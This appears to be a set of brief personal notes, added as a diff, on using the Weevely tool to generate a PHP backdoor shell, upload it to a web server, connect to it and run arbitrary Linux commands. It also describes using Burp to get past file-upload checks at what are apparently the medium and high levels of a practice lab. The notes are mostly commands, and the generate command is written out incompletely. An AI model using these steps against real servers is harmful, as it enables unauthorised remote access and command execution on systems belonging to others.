@@ -1,0 +1,13 @@
+Using weevly
+Generating a Backdoor
+weevly generate [passord] [file name]
+weevly generate  /root/shell.php
+After that upload the file 
+Connecting too the uploaded shell file
+weevely http:// url of the shell.php 123456 
+NExt you can run any Linux command
+
+At medium level security
+Using burp- changing the file type to .php again on the burp
+At high level security
+Using burp- changing the file type to .php.jpg again on the burp
